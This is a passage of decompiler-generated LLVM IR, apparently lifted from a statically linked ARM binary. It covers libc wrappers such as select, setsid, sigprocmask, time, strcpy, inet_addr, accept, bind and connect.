  br i1 %tmp, label %dec_label_pc_ff64, label %dec_label_pc_ff4c

dec_label_pc_ff4c:                                ; preds = %entry
  %v0_ff50 = call i32 @__aeabi_read_tp()
  %v3_ff54 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_ff54 = sext i16 %v3_ff54 to i32
  %v0_ff58 = load i32, i32* %r2.global-to-local, align 4
  %v1_ff58 = sub i32 0, %v0_ff58
  store i32 %v1_ff58, i32* %r2.global-to-local, align 4
  %v3_ff5c = add i32 %v4_ff54, %v0_ff50
  %v4_ff5c = inttoptr i32 %v3_ff5c to i32*
  store i32 %v1_ff58, i32* %v4_ff5c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_ff64.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_ff64

dec_label_pc_ff64:                                ; preds = %entry, %dec_label_pc_ff4c
  %v1_ff68 = phi i32 [ %v0_ff3c, %entry ], [ -1, %dec_label_pc_ff4c ]
  %v2_ff64 = phi i32 [ %v3_ff2c, %entry ], [ %v2_ff64.pre, %dec_label_pc_ff4c ]
  store i32 %v2_ff64, i32* @r4, align 4
  ret i32 %v1_ff68

; uselistorder directives
  uselistorder i32 %v0_ff3c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ff64, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_ff70 = load i32, i32* @r4, align 4
  store i32 %v3_ff70, i32* %stack_var_-12, align 4
  %v0_ff80 = load i32, i32* @r0, align 4
  store i32 %v0_ff80, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ff80, -4095
  br i1 %tmp, label %dec_label_pc_ffa8, label %dec_label_pc_ff90

dec_label_pc_ff90:                                ; preds = %entry
  %v0_ff94 = call i32 @__aeabi_read_tp()
  %v3_ff98 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_ff98 = sext i16 %v3_ff98 to i32
  %v0_ff9c = load i32, i32* %r2.global-to-local, align 4
  %v1_ff9c = sub i32 0, %v0_ff9c
  store i32 %v1_ff9c, i32* %r2.global-to-local, align 4
  %v3_ffa0 = add i32 %v4_ff98, %v0_ff94
  %v4_ffa0 = inttoptr i32 %v3_ffa0 to i32*
  store i32 %v1_ff9c, i32* %v4_ffa0, align 4
  %v2_ffa8.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_ffa8

dec_label_pc_ffa8:                                ; preds = %entry, %dec_label_pc_ff90
  %v1_ffac = phi i32 [ %v0_ff80, %entry ], [ -1, %dec_label_pc_ff90 ]
  %v2_ffa8 = phi i32 [ %v3_ff70, %entry ], [ %v2_ffa8.pre, %dec_label_pc_ff90 ]
  store i32 %v2_ffa8, i32* @r4, align 4
  ret i32 %v1_ffac

; uselistorder directives
  uselistorder i32 %v0_ff80, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ffa8, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_ffb4 = load i32, i32* @r4, align 4
  store i32 %v3_ffb4, i32* %stack_var_-28, align 4
  %v6_ffb4 = load i32, i32* @r5, align 4
  %v9_ffb4 = load i32, i32* @r6, align 4
  %v12_ffb4 = load i32, i32* @r7, align 4
  %v15_ffb4 = load i32, i32* @r8, align 4
  %v18_ffb4 = load i32, i32* @sl, align 4
  %v21_ffb4 = load i32, i32* @lr, align 4
  %v4_ffc4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 12684) to i32*), align 4
  %v2_ffcc = icmp eq i32 %v4_ffc4, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_ffcc, label %dec_label_pc_ffe8, label %entry.dec_label_pc_fff4_crit_edge

entry.dec_label_pc_fff4_crit_edge:                ; preds = %entry
  br label %dec_label_pc_fff4

dec_label_pc_ffe8:                                ; preds = %entry
  store i32 %v3_ffb4, i32* @r4, align 4
  store i32 %v9_ffb4, i32* @r6, align 4
  store i32 %v12_ffb4, i32* @r7, align 4
  store i32 %v15_ffb4, i32* @r8, align 4
  store i32 %v18_ffb4, i32* %sl.global-to-local, align 4
  %v0_fff0 = call i32 @__syscall_select()
  br label %dec_label_pc_fff4

dec_label_pc_fff4:                                ; preds = %entry.dec_label_pc_fff4_crit_edge, %dec_label_pc_ffe8
  %v0_fff4 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_fff4, i32* @r5, align 4
  %v0_10008 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_10008, i32* @r0, align 4
  %v0_10010 = call i32 @__syscall_select()
  store i32 %v0_10010, i32* @r4, align 4
  %v0_10018 = load i32, i32* @r5, align 4
  %v1_1001c = call i32 @__libc_disable_asynccancel(i32 %v0_10018)
  %v0_10020 = load i32, i32* @r4, align 4
  %v2_10028 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_10028, i32* @r4, align 4
  store i32 %v6_ffb4, i32* @r5, align 4
  store i32 %v9_ffb4, i32* @r6, align 4
  store i32 %v12_ffb4, i32* @r7, align 4
  store i32 %v15_ffb4, i32* @r8, align 4
  store i32 %v18_ffb4, i32* @sl, align 4
  store i32 %v21_ffb4, i32* @lr, align 4
  ret i32 %v0_10020

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fff4, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10038 = load i32, i32* @r7, align 4
  store i32 %v3_10038, i32* %stack_var_-8, align 4
  %v0_10044 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10044, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10044, -4095
  br i1 %tmp, label %dec_label_pc_1006c, label %dec_label_pc_10054

dec_label_pc_10054:                               ; preds = %entry
  %v0_10058 = call i32 @__aeabi_read_tp()
  %v3_1005c = load i16, i16* @global_var_20d4c.598, align 2
  %v4_1005c = sext i16 %v3_1005c to i32
  %v0_10060 = load i32, i32* %r2.global-to-local, align 4
  %v1_10060 = sub i32 0, %v0_10060
  store i32 %v1_10060, i32* %r2.global-to-local, align 4
  %v3_10064 = add i32 %v4_1005c, %v0_10058
  %v4_10064 = inttoptr i32 %v3_10064 to i32*
  store i32 %v1_10060, i32* %v4_10064, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1006c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1006c

dec_label_pc_1006c:                               ; preds = %entry, %dec_label_pc_10054
  %v1_10070 = phi i32 [ %v0_10044, %entry ], [ -1, %dec_label_pc_10054 ]
  %v2_1006c = phi i32 [ %v3_10038, %entry ], [ %v2_1006c.pre, %dec_label_pc_10054 ]
  store i32 %v2_1006c, i32* @r7, align 4
  ret i32 %v1_10070

; uselistorder directives
  uselistorder i32 %v0_10044, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1006c, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_1007c = icmp eq i32* %arg2, null
  br i1 %v2_1007c, label %dec_label_pc_100c0, label %dec_label_pc_10090

dec_label_pc_10090:                               ; preds = %entry
  %v2_10090 = load i32, i32* %arg2, align 4
  %v1_10094 = icmp slt i32 %v2_10090, 0
  br i1 %v1_10094, label %dec_label_pc_100a8, label %dec_label_pc_1009c

dec_label_pc_1009c:                               ; preds = %dec_label_pc_10090
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_1009c = load i32, i32* %.pre3, align 4
  %v1_100a0 = urem i32 %v3_1009c, 2
  %v2_100a0 = icmp eq i32 %v1_100a0, 0
  br i1 %v2_100a0, label %dec_label_pc_100c0, label %dec_label_pc_100a8

dec_label_pc_100a8:                               ; preds = %dec_label_pc_10090, %dec_label_pc_1009c
  %v2_100a8 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_100a8 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_100c0

dec_label_pc_100c0:                               ; preds = %dec_label_pc_1009c, %entry, %dec_label_pc_100a8
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_100f4, label %dec_label_pc_100dc

dec_label_pc_100dc:                               ; preds = %dec_label_pc_100c0
  %v1_100e0 = sub i32 0, %arg1
  %v3_100e4 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_100e4 = sext i16 %v3_100e4 to i32
  %v0_100e8 = call i32 @__aeabi_read_tp()
  %v3_100ec = add i32 %v4_100e4, %v0_100e8
  %v4_100ec = inttoptr i32 %v3_100ec to i32*
  store i32 %v1_100e0, i32* %v4_100ec, align 4
  br label %dec_label_pc_100f4

dec_label_pc_100f4:                               ; preds = %dec_label_pc_100c0, %dec_label_pc_100dc
  %v1_100fc = phi i32 [ %arg1, %dec_label_pc_100c0 ], [ -1, %dec_label_pc_100dc ]
  ret i32 %v1_100fc

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100f4, { 1, 0 }
  uselistorder label %dec_label_pc_100c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100a8, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_10108 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_10118 = call i32 @gettimeofday(i32 %v2_10108, i32 0)
  %v2_1011c = load i32, i32* %stack_var_-16, align 4
  %v2_10120 = icmp eq i32* %arg1, null
  br i1 %v2_10120, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_1011c, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_1011c

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_10134 = load i32, i32* @lr, align 4
  %v0_1013c = call i32 @__aeabi_read_tp()
  %v3_10140 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_10140 = sext i16 %v3_10140 to i32
  %v2_10144 = add i32 %v4_10140, %v0_1013c
  store i32 %v0_10134, i32* @lr, align 4
  ret i32 %v2_10144
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_10158 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10158, i32* @r0, align 4
  %v1_10160 = call i32 @times(i32 %v2_10158)
  %v2_10164 = load i32, i32* %stack_var_-24, align 4
  %v2_10168 = add i32 %v2_10164, %tmp
  %v2_10170 = mul i32 %v2_10168, 10000
  %v1_10174 = and i32 %v2_10170, 2147483632
  ret i32 %v1_10174

; uselistorder directives
  uselistorder i32 %v2_10158, { 1, 0 }
}

define i32 @"$d.11"(i32 %arg1) local_unnamed_addr {
dec_label_pc_10184:
  %v0_10184 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10184, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_10184
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_10184, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_10190 = call i32 @_memcpy()
  ret i32 %v0_10190
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_101a0 = call i32 @_memcpy()
  ret i32 %v0_101a0

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_101c01 = load i32, i32* @r1, align 4
  %v1_101c02 = inttoptr i32 %v0_101c01 to i8*
  %v2_101c03 = load i8, i8* %v1_101c02, align 1
  %v2_101c45 = icmp eq i8 %v2_101c03, 0
  store i1 %v2_101c45, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_101c03, i8* %arg1, align 1
  br i1 %v2_101c45, label %dec_label_pc_101d0, label %dec_label_pc_101b8

dec_label_pc_101b8:                               ; preds = %entry, %dec_label_pc_101b8
  %v0_101b8 = load i32, i32* @r1, align 4
  %v1_101b8 = add i32 %v0_101b8, 1
  store i32 %v1_101b8, i32* @r1, align 4
  %v0_101bc = load i32, i32* %r2.global-to-local, align 4
  %v1_101bc = add i32 %v0_101bc, 1
  store i32 %v1_101bc, i32* %r2.global-to-local, align 4
  %v1_101c0 = inttoptr i32 %v1_101b8 to i8*
  %v2_101c0 = load i8, i8* %v1_101c0, align 1
  %v2_101c4 = icmp eq i8 %v2_101c0, 0
  store i1 %v2_101c4, i1* %cpsr_z.global-to-local, align 1
  %v3_101c8 = inttoptr i32 %v1_101bc to i8*
  store i8 %v2_101c0, i8* %v3_101c8, align 1
  %v0_101cc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_101cc, label %dec_label_pc_101d0, label %dec_label_pc_101b8

dec_label_pc_101d0:                               ; preds = %dec_label_pc_101b8, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_101b8, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_101dc = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_101dc, i32* @r1, align 4
  %v0_101e0 = call i32 @inet_aton()
  %v2_101e4 = icmp eq i32 %v0_101e0, 0
  %v4_101e8 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_101e4, i32 -1, i32 %v4_101e8
  ret i32 %storemerge
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_101fc = load i32, i32* @r7, align 4
  store i32 %v3_101fc, i32* %stack_var_-8, align 4
  %v0_10208 = load i32, i32* @r0, align 4
  store i32 %v0_10208, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10208, -4095
  br i1 %tmp, label %dec_label_pc_10230, label %dec_label_pc_10218

dec_label_pc_10218:                               ; preds = %entry
  %v0_1021c = call i32 @__aeabi_read_tp()
  %v3_10220 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_10220 = sext i16 %v3_10220 to i32
  %v0_10224 = load i32, i32* %r2.global-to-local, align 4
  %v1_10224 = sub i32 0, %v0_10224
  store i32 %v1_10224, i32* %r2.global-to-local, align 4
  %v3_10228 = add i32 %v4_10220, %v0_1021c
  %v4_10228 = inttoptr i32 %v3_10228 to i32*
  store i32 %v1_10224, i32* %v4_10228, align 4
  %v2_10230.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10230

dec_label_pc_10230:                               ; preds = %entry, %dec_label_pc_10218
  %v1_10234 = phi i32 [ %v0_10208, %entry ], [ -1, %dec_label_pc_10218 ]
  %v2_10230 = phi i32 [ %v3_101fc, %entry ], [ %v2_10230.pre, %dec_label_pc_10218 ]
  store i32 %v2_10230, i32* @r7, align 4
  ret i32 %v1_10234

; uselistorder directives
  uselistorder i32 %v0_10208, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10230, { 1, 0 }
}

define i32 @"$d.10"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10238:
  %v0_10238 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10238, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10238
  %v2_1023c = load i32, i32* @r4, align 4
  %v5_1023c = udiv i32 %v2_1023c, 4194304
  %v6_1023c = and i32 %v5_1023c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10238, %bb
  %v7_1023c = phi i32 [ %arg1, %dec_label_pc_10238 ], [ %v6_1023c, %bb ]
  ret i32 %v7_1023c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10244 = load i32, i32* @r4, align 4
  store i32 %v3_10244, i32* %stack_var_-20, align 4
  %v6_10244 = load i32, i32* @r5, align 4
  %v9_10244 = load i32, i32* @r6, align 4
  %v12_10244 = load i32, i32* @r7, align 4
  %v4_10250 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 12684) to i32*), align 4
  %v2_10254 = icmp eq i32 %v4_10250, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_10254, label %dec_label_pc_1026c, label %entry.dec_label_pc_10278_crit_edge

entry.dec_label_pc_10278_crit_edge:               ; preds = %entry
  br label %dec_label_pc_10278

dec_label_pc_1026c:                               ; preds = %entry
  store i32 %v3_10244, i32* @r4, align 4
  store i32 %v9_10244, i32* @r6, align 4
  store i32 %v12_10244, i32* @r7, align 4
  %v0_10274 = call i32 @__sys_accept()
  br label %dec_label_pc_10278

dec_label_pc_10278:                               ; preds = %entry.dec_label_pc_10278_crit_edge, %dec_label_pc_1026c
  %v0_10278 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10278, i32* @r5, align 4
  %v0_10288 = load i32, i32* @r4, align 4
  store i32 %v0_10288, i32* @r0, align 4
  %v0_1028c = call i32 @__sys_accept()
  store i32 %v0_1028c, i32* @r4, align 4
  %v0_10294 = load i32, i32* @r5, align 4
  %v1_10298 = call i32 @__libc_disable_asynccancel(i32 %v0_10294)
  %v0_1029c = load i32, i32* @r4, align 4
  %v2_102a4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_102a4, i32* @r4, align 4
  store i32 %v6_10244, i32* @r5, align 4
  store i32 %v9_10244, i32* @r6, align 4
  store i32 %v12_10244, i32* @r7, align 4
  ret i32 %v0_1029c

; uselistorder directives
  uselistorder label %dec_label_pc_10278, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_102b4 = load i32, i32* @r7, align 4
  store i32 %v3_102b4, i32* %stack_var_-8, align 4
  %v0_102c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_102c0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_102c0, -4095
  br i1 %tmp, label %dec_label_pc_102e8, label %dec_label_pc_102d0

dec_label_pc_102d0:                               ; preds = %entry
  %v0_102d4 = call i32 @__aeabi_read_tp()
  %v3_102d8 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_102d8 = sext i16 %v3_102d8 to i32
  %v0_102dc = load i32, i32* %r2.global-to-local, align 4
  %v1_102dc = sub i32 0, %v0_102dc
  store i32 %v1_102dc, i32* %r2.global-to-local, align 4
  %v3_102e0 = add i32 %v4_102d8, %v0_102d4
  %v4_102e0 = inttoptr i32 %v3_102e0 to i32*
  store i32 %v1_102dc, i32* %v4_102e0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_102e8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_102e8

dec_label_pc_102e8:                               ; preds = %entry, %dec_label_pc_102d0
  %v1_102ec = phi i32 [ %v0_102c0, %entry ], [ -1, %dec_label_pc_102d0 ]
  %v2_102e8 = phi i32 [ %v3_102b4, %entry ], [ %v2_102e8.pre, %dec_label_pc_102d0 ]
  store i32 %v2_102e8, i32* @r7, align 4
  ret i32 %v1_102ec

; uselistorder directives
  uselistorder i32 %v0_102c0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_102e8, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_102f0:
  %v0_102f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_102f0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_102f0
  %v2_102f4 = load i32, i32* @ip, align 4
  %v3_102f4 = udiv i32 %v2_102f4, 1048576
  %v4_102f4 = mul i32 %v2_102f4, 4096
  %v5_102f4 = or i32 %v3_102f4, %v4_102f4
  %v8_102f4 = and i32 %v5_102f4, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_102f0, %bb
  %v9_102f4 = phi i32 [ %arg1, %dec_label_pc_102f0 ], [ %v8_102f4, %bb ]
  ret i32 %v9_102f4

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_102f8 = load i32, i32* @r7, align 4
  store i32 %v3_102f8, i32* %stack_var_-8, align 4
  %v0_10304 = load i32, i32* @r0, align 4
  store i32 %v0_10304, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10304, -4095
  br i1 %tmp, label %dec_label_pc_1032c, label %dec_label_pc_10314

dec_label_pc_10314:                               ; preds = %entry
  %v0_10318 = call i32 @__aeabi_read_tp()
  %v3_1031c = load i16, i16* @global_var_20d4c.598, align 2
  %v4_1031c = sext i16 %v3_1031c to i32
  store i32 %v4_1031c, i32* @r3, align 4
  %v0_10320 = load i32, i32* %r2.global-to-local, align 4
  %v1_10320 = sub i32 0, %v0_10320
  store i32 %v1_10320, i32* %r2.global-to-local, align 4
  %v3_10324 = add i32 %v4_1031c, %v0_10318
  %v4_10324 = inttoptr i32 %v3_10324 to i32*
  store i32 %v1_10320, i32* %v4_10324, align 4
  %v2_1032c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1032c

dec_label_pc_1032c:                               ; preds = %entry, %dec_label_pc_10314
  %v1_10330 = phi i32 [ %v0_10304, %entry ], [ -1, %dec_label_pc_10314 ]
  %v2_1032c = phi i32 [ %v3_102f8, %entry ], [ %v2_1032c.pre, %dec_label_pc_10314 ]
  store i32 %v2_1032c, i32* @r7, align 4
  ret i32 %v1_10330

; uselistorder directives
  uselistorder i32 %v0_10304, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1032c, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10334:
  %v0_10334 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10334, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10334
  %v2_10338 = load i32, i32* @r8, align 4
  %v5_10338 = udiv i32 %v2_10338, 1048576
  %v6_10338 = and i32 %v5_10338, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10334, %bb
  %v7_10338 = phi i32 [ %arg1, %dec_label_pc_10334 ], [ %v6_10338, %bb ]
  ret i32 %v7_10338

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10340 = load i32, i32* @r4, align 4
  store i32 %v3_10340, i32* %stack_var_-20, align 4
  %v6_10340 = load i32, i32* @r5, align 4
  %v9_10340 = load i32, i32* @r6, align 4
  %v12_10340 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r3, align 4
  %v4_1034c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 12684) to i32*), align 4
  store i32 %v4_1034c, i32* @ip, align 4
  %v2_10350 = icmp eq i32 %v4_1034c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_10350, label %dec_label_pc_10368, label %entry.dec_label_pc_10374_crit_edge

entry.dec_label_pc_10374_crit_edge:               ; preds = %entry
  br label %dec_label_pc_10374

dec_label_pc_10368:                               ; preds = %entry
  store i32 %v3_10340, i32* @r4, align 4
  store i32 %v9_10340, i32* @r6, align 4
  store i32 %v12_10340, i32* @r7, align 4
  %v0_10370 = call i32 @__sys_connect()
  br label %dec_label_pc_10374

dec_label_pc_10374:                               ; preds = %entry.dec_label_pc_10374_crit_edge, %dec_label_pc_10368
  %v0_10374 = call i32 @__libc_enable_asynccancel()
  %v0_10378 = load i32, i32* @r6, align 4
  store i32 %v0_10378, i32* @r1, align 4
  store i32 %v0_10374, i32* @r5, align 4
  %v0_10384 = load i32, i32* @r4, align 4
  store i32 %v0_10384, i32* @r0, align 4
  %v0_10388 = call i32 @__sys_connect()
  store i32 %v0_10388, i32* @r4, align 4
  %v0_10390 = load i32, i32* @r5, align 4
  %v1_10394 = call i32 @__libc_disable_asynccancel(i32 %v0_10390)
  %v0_10398 = load i32, i32* @r4, align 4
  %v2_103a0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_103a0, i32* @r4, align 4
  store i32 %v6_10340, i32* @r5, align 4
  store i32 %v9_10340, i32* @r6, align 4
  store i32 %v12_10340, i32* @r7, align 4
  ret i32 %v0_10398

; uselistorder directives
  uselistorder label %dec_label_pc_10374, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_103b0 = load i32, i32* @r7, align 4
  store i32 %v3_103b0, i32* %stack_var_-8, align 4
  %v0_103bc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_103bc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_103bc, -4095
  br i1 %tmp, label %dec_label_pc_103e4, label %dec_label_pc_103cc

dec_label_pc_103cc:                               ; preds = %entry
  %v0_103d0 = call i32 @__aeabi_read_tp()
  %v3_103d4 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_103d4 = sext i16 %v3_103d4 to i32
  %v0_103d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_103d8 = sub i32 0, %v0_103d8
  store i32 %v1_103d8, i32* %r2.global-to-local, align 4
  %v3_103dc = add i32 %v4_103d4, %v0_103d0
  %v4_103dc = inttoptr i32 %v3_103dc to i32*
  store i32 %v1_103d8, i32* %v4_103dc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_103e4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_103e4

dec_label_pc_103e4:                               ; preds = %entry, %dec_label_pc_103cc
  %v1_103e8 = phi i32 [ %v0_103bc, %entry ], [ -1, %dec_label_pc_103cc ]
  %v2_103e4 = phi i32 [ %v3_103b0, %entry ], [ %v2_103e4.pre, %dec_label_pc_103cc ]
  store i32 %v2_103e4, i32* @r7, align 4
  ret i32 %v1_103e8

; uselistorder directives
  uselistorder i32 %v0_103bc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_103e4, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_103ec:
  %v0_103ec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_103ec, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_103ec
  %v2_103ec = load i32, i32* @lr, align 4
  %v8_103ec = shl i32 %v2_103ec, %arg2
  %v9_103ec = and i32 %v8_103ec, %arg1
  %v3_103f0 = load i32, i32* @sb, align 4
  %v4_103f0 = lshr i32 %v9_103ec, %v3_103f0
  %v5_103f0 = sub i32 32, %v3_103f0
  %v6_103f0 = shl i32 %v9_103ec, %v5_103f0
  %v7_103f0 = or i32 %v6_103f0, %v4_103f0
  %v9_103f0 = and i32 %v7_103f0, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_103ec, %bb
  %v10_103f0 = phi i32 [ %arg1, %dec_label_pc_103ec ], [ %v9_103f0, %bb ]
  ret i32 %v10_103f0

; uselistorder directives
  uselistorder i32 %v9_103ec, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
